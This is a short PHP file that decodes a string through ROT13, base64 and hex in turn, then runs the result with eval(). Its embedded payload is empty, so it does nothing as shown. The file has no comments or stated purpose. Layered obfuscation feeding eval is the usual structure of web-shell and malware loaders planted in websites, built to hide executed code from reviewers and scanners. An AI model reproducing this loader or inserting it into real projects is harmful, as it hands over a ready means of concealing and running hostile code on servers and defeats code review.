<?php
function complexDecode($encoded)
{
  $rot13 = str_rot13($encoded);
  $base64Decoded = base64_decode($rot13);
  $decoded = '';
  for ($i = 0; $i < strlen($base64Decoded); $i += 2) {
    $decoded .= chr(hexdec(substr($base64Decoded, $i, 2)));
  }

  return $decoded;
}
$encodedCode = '';
$decodedCode = complexDecode($encodedCode);
eval('?>' . $decodedCode);
